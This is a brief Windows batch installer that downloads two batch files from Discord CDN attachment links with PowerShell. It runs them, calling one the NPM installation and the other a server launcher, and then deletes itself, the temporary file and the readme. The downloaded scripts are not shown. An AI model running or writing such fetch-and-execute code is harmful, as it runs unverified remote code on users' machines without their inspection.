@echo off
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/983998821786878002/1026344036728061982/QuickServerLaunch.bat -Outfile QuickServerLaunch.bat"
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/983998821786878002/1026344793527304212/temp.bat -Outfile temp.bat"
START temp.bat
cls
@echo The window that just opened is the NPM installation.
@echo Please wait for that installation to finish. Close that after, then press any key to continue.
pause
START QuickServerLaunch.bat
DEL temp.bat
DEL readme.md
DEL install.bat
